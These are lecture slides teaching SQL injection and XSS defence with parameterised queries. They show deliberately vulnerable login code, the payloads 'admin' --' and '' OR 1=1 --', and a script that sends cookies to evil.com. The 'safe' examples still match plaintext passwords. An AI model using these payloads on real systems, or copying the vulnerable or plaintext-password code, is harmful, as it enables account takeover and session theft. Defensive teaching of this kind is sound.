\section{Database Security}

% ----------------------------------------------------------
\begin{frame}{Database Security -- Overview}
  Database security encompasses all policies and measures to protect database contents,
  services, and infrastructure from unauthorised access, misuse, and corruption.

  \begin{block}{Key Threat Vectors}
    \begin{itemize}
      \item \textbf{SQL Injection} -- malicious code injected through user input
      \item \textbf{Excessive privileges} -- accounts with far more permissions than needed
      \item \textbf{Weak authentication} -- default passwords, no lockout, shared accounts
      \item \textbf{Unencrypted connections} -- data sent in plaintext over the network
      \item \textbf{Unencrypted stored data} -- passwords and PII stored in plain text
      \item \textbf{Missing audit logs} -- no record of who accessed what data and when
      \item \textbf{Unpatched software} -- known CVEs in older DBMS versions
      \item \textbf{Cross-Site Scripting (XSS)} -- injecting scripts via stored user content
    \end{itemize}
  \end{block}

  \begin{alertblock}{Focus of This Section}
    We focus in depth on \textbf{SQL Injection} -- the most widespread and destructive
    attack vector -- and its primary defence: \textbf{parameterised queries}.
  \end{alertblock}
\end{frame}

% ----------------------------------------------------------
\begin{frame}{SQL Injection -- What Is It?}
  \begin{block}{Definition}
    \textbf{SQL Injection} is a code injection attack where an attacker inserts malicious SQL code
    into a user-facing input field. If the application builds SQL queries by string concatenation,
    the injected code becomes part of the executed query.
  \end{block}

  \begin{itemize}
    \item First publicly documented in \textbf{1998} by Jeff Forristal (alias ``rfp'') in \emph{Phrack}.
    \item Consistently ranked in the \textbf{OWASP Top 10} most critical web security risks.
    \item Root cause: \textbf{user-supplied data is treated as SQL code} instead of a literal value.
    \item Consequences: unauthorised data read, data modification/deletion, authentication bypass,
          and in extreme cases remote code execution on the database server.
  \end{itemize}

  \begin{exampleblock}{Why Is It Still So Common?}
    SQL injection is easy to make (one line of careless code) and hard to notice during development.
    It only manifests when malicious input arrives in production.
  \end{exampleblock}
\end{frame}

% ----------------------------------------------------------
\begin{frame}[fragile]{SQL Injection -- The Vulnerable Code}
  \textbf{Login form that builds a query by string concatenation:}

  \begin{lstlisting}[style=sqlstyle]
-- Application code (pseudo-SQL / PHP-style):
$query = "SELECT * FROM users
          WHERE username = '" . $username . "'
          AND   password = '" . $password . "'";
  \end{lstlisting}

  \medskip
  For a normal user, e.g.\ username = \texttt{alice}, password = \texttt{hunter2}, this produces:

  \begin{lstlisting}[style=sqlstyle]
SELECT * FROM users
WHERE  username = 'alice'
AND    password = 'hunter2'
  \end{lstlisting}

  \begin{alertblock}{The Problem}
    The database cannot distinguish between the \emph{structure} of the query and
    \emph{user-supplied values}. If the user supplies SQL syntax, it becomes part of the query.
  \end{alertblock}
\end{frame}

% ----------------------------------------------------------
\begin{frame}[fragile]{SQL Injection -- Attack 1: Comment Injection}
  \textbf{Attacker enters:}
  \begin{itemize}
    \item Username: \texttt{admin' --}
    \item Password: \texttt{anything}
  \end{itemize}

  \medskip
  \textbf{The application builds and executes:}
  \begin{lstlisting}[style=sqlstyle]
SELECT * FROM users
WHERE  username = 'admin' --' AND password = 'anything'
  \end{lstlisting}

  The \texttt{--} is a SQL line comment. Everything after it is \textbf{ignored}.
  The password check is commented out entirely.

  \begin{alertblock}{Result}
    The query returns the \texttt{admin} user without ever checking the password.
    The attacker is now logged in as administrator with \textbf{zero knowledge of the real password}.
  \end{alertblock}
\end{frame}

% ----------------------------------------------------------
\begin{frame}[fragile]{SQL Injection -- Attack 2: OR 1=1}
  \textbf{Attacker enters:}
  \begin{itemize}
    \item Username: \texttt{' OR 1=1 --}
    \item Password: \texttt{anything}
  \end{itemize}

  \textbf{Query built by the application:}
  \begin{lstlisting}[style=sqlstyle]
SELECT * FROM users
WHERE  username = '' OR 1=1 --' AND password = 'anything'
  \end{lstlisting}

  \texttt{OR 1=1} is always \texttt{TRUE}, so the entire \texttt{WHERE} evaluates to \texttt{TRUE}
  for \emph{every row} in the table.

  \begin{alertblock}{Result}
    The query returns \textbf{all rows in the users table}. The attacker logs in as the first
    user returned -- typically the administrator with the lowest ID.
  \end{alertblock}

  \begin{block}{Other Variants}
    Attackers also use \texttt{UNION SELECT} to extract data from other tables, \texttt{DROP TABLE}
    to destroy data, or \texttt{INSERT} to create backdoor accounts.
  \end{block}
\end{frame}

% ----------------------------------------------------------
\begin{frame}{Real-World SQL Injection Cases}
  \begin{alertblock}{All of these were preventable with a single code change}
    \begin{itemize}
      \item \textbf{Heartland Payment Systems (2008)}: 100 million credit/debit card numbers stolen.
            Heartland paid over \$140 million in settlements. Largest US data breach at the time.
      \item \textbf{Sony Pictures (2011)}: 1 million user accounts exposed -- including plaintext
            passwords, email addresses, and home addresses. Exploited via a single vulnerable
            sweepstakes page.
      \item \textbf{TalkTalk (2015)}: 157,000 UK customers' personal and financial data exposed.
            ICO fined TalkTalk \pounds 400,000. Attacker was a 17-year-old.
    \end{itemize}
  \end{alertblock}

  \begin{block}{The Key Insight}
    In every case, a single \textbf{parameterised query} in place of string concatenation would
    have made the injection \emph{structurally impossible}.
    The fix costs minutes; the attack costs millions.
  \end{block}
\end{frame}

% ----------------------------------------------------------
\begin{frame}[fragile]{Fix: Parameterised Queries -- Python}
  \textbf{Never construct SQL by concatenating user input.}
  Use \textbf{parameterised queries} (prepared statements) instead.

  \begin{lstlisting}[style=sqlstyle, language=Python]
import mysql.connector

conn = mysql.connector.connect(host='localhost',
                               user='app', password='...',
                               database='music_db')
cursor = conn.cursor()

username = input("Username: ")   # could be malicious!
password = input("Password: ")

# VULNERABLE -- never do this:
# cursor.execute("SELECT * FROM users WHERE name='" + username + "'")

# SAFE -- parameterised query:
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password)   # values passed separately as a tuple
)
user = cursor.fetchone()
  \end{lstlisting}

  The \texttt{\%s} placeholders are \textbf{never interpreted as SQL}.
  The driver escapes the values and sends them separately from the query structure.
\end{frame}

% ----------------------------------------------------------
\begin{frame}[fragile]{Fix: Parameterised Queries -- Java}
  \begin{lstlisting}[style=sqlstyle, language=Java]
// VULNERABLE -- string concatenation:
String sql = "SELECT * FROM users WHERE username = '"
             + username + "' AND password = '" + password + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(sql);  // NEVER DO THIS

// --------------------------------------------------------

// SAFE -- PreparedStatement (parameterised query):
String sql = "SELECT * FROM users WHERE username = ? "
           + "AND password = ?";
PreparedStatement ps = conn.prepareStatement(sql);
ps.setString(1, username);   // parameter 1 = ?
ps.setString(2, password);   // parameter 2 = ?
ResultSet rs = ps.executeQuery();
// Any SQL syntax in 'username' or 'password' is treated
// as literal text -- injection is impossible.
  \end{lstlisting}

  \begin{block}{How It Works}
    The SQL structure is \textbf{compiled first}, then parameter values are bound as data.
    The DBMS engine \emph{never} parses the parameter values as SQL.
  \end{block}
\end{frame}

% ----------------------------------------------------------
\begin{frame}{Fix: XSS -- Cross-Site Scripting (Brief)}
  \begin{block}{What is XSS?}
    \textbf{Cross-Site Scripting (XSS)} injects malicious JavaScript into web pages that
    are then executed by other users' browsers. Stored XSS: the script is saved in the database
    and displayed to every visitor.
  \end{block}

  \begin{exampleblock}{Example}
    A user submits this as their display name: \\
    \texttt{<script>document.location='https://evil.com/?c='+document.cookie</script>}\\[4pt]
    If stored unescaped in the DB and rendered verbatim in HTML, every user who views that page
    sends their session cookie to the attacker.
  \end{exampleblock}

  \begin{block}{Defences}
    \begin{itemize}
      \item \textbf{Output encoding}: escape HTML special characters (\texttt{<}, \texttt{>},
            \texttt{\&}, \texttt{"}) before rendering user content in HTML.
      \item \textbf{Content-Security-Policy (CSP)} HTTP header restricts which scripts may execute.
      \item \textbf{Server-side input validation}: reject input that contains HTML/script tags.
    \end{itemize}
  \end{block}
\end{frame}

% ----------------------------------------------------------
\begin{frame}{Database Hardening Checklist}
  Parameterised queries are the primary defence. These measures provide additional protection layers:

  \begin{block}{Configuration and Access Hardening}
    \begin{itemize}
      \item \textbf{Rename privileged accounts}: avoid default names \texttt{root}, \texttt{admin},
            \texttt{sa} -- attackers target these specifically.
      \item \textbf{Principle of Least Privilege}: application DB account should have only
            \texttt{SELECT}/\texttt{INSERT} on specific tables; never \texttt{DROP} or \texttt{GRANT}.
      \item \textbf{Disable unused default accounts} created during DBMS installation.
      \item \textbf{Server-side input validation}: never trust client-side JavaScript validation;
            always validate on the server.
      \item \textbf{Suppress error messages}: never expose raw SQL errors to end users -- they
            reveal table names, column names, and DB structure.
      \item \textbf{Encrypt sensitive data}: passwords must be stored as salted hashes
            (\texttt{bcrypt}, \texttt{Argon2}), never plain text. Encrypt sensitive columns at rest.
      \item \textbf{Enable TLS} for all database connections.
    \end{itemize}
  \end{block}
\end{frame}
